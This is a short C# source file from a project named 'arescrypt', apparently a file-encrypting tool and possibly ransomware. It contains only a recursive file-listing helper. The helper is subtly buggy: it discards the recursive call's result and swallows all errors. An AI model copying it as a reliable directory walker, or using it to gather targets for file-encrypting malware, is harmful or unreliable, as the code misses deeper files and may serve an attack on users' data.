using System;
using System.IO;
using System.Collections.Generic;

namespace arescrypt
{
    class FileHandler
    {
        // Recursivly list files in a given directory
        public static List<string> DirSearch(string sDir)
        {
            var fileIndex = new List<string> { };
            try
            {
                foreach (string file in Directory.GetFiles(sDir)) // Search current directory
                    fileIndex.Add(file);
                foreach (string dir in Directory.GetDirectories(sDir))
                {
                    foreach (string file in Directory.GetFiles(dir))
                        fileIndex.Add(file);
                    DirSearch(dir); // Search subdirectories
                }
            } catch (Exception) { }

            return fileIndex;
        }
    }
}
